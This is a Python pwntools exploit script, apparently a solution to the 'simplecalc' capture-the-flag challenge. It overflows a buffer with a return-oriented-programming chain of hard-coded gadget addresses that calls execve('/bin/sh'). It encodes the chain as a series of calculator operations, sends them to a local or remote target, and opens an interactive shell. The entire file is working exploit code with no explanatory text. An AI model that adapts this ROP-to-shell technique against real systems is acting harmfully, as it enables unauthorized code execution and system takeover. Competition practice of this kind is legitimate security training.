#!/usr/bin/env python2
from pwn import *
import sys
# eip is 0x40 away

# rop gadgets
setrdxrsi = p64(0x0000000000437aa9) # pop rdx; pop rsi; ret

poprax = p64(0x000000000044db34) # pop rax; ret

poprdi = p64(0x0000000000401b73) # pop rdi, ret

movrdirsp = p64(0x0000000000492468) # mov rdi, rsp; call r12

popr12 = p64(0x0000000000400493)

syscall = p64(0x00000000004648e5)

zero = p64(0)
execve = p64(0x3b)
payload = b"/bin/sh\x00"

# build our buffer
buf = b"" + payload # ignore this, remenant of a failed attempt
buf += b"\x00" * (0x40 - len(payload))
buf += zero # padding because i screwed up somewhere else
buf += setrdxrsi # xor rdx, rdx; xor rsi, rsi
buf += zero
buf += zero
buf += poprax # pop rax
buf += execve # syscall code
buf += popr12 # pop r12
buf += syscall # syscall addr
buf += movrdirsp # mov rdi, rsp; call r12
buf += payload # /bin/sh

#print(buf)
#print(len(buf))

# returns 2 numbers and an operation to get a given byte string
# can't use numbers lower than 39
def getnumop(i):
    if i == 0:
        return [50, 50, '2', i]
    if i < 50:
        return [50 + i, 50, '2', i]
    if (i - 50) > 50:
        return [50, i - 50, '1', i]
    if i < (39 + 39):
        return [i+50, 50, '2', i]
    if i-40 > 39:
        return [i-40, 40, '1', i]
    print("Couldn't find a combo for", i)

# generate ops
# add padding
while len(buf) % 4 != 0:
    buf += b'A'

ops = []
for i in range(0, len(buf), 4):
    ops.append(getnumop(u32(buf[i:i+4])))

numops = len(ops) + 1 # so that we can type 5 at the end

# lets root it!
p = process("simplecalc")
#p = remote("simplecalc.bostonkey.party", 5400)
p.recvuntil("calculations: ")
p.sendline(str(numops))
for op in ops:
    p.recvuntil("=>")
    p.sendline(op[2])
    p.sendline(str(op[0]))
    p.sendline(str(op[1]))
    p.recvuntil(".\n\n")
#p.interactive()
p.recvuntil("=>")
p.sendline('5')
p.interactive()
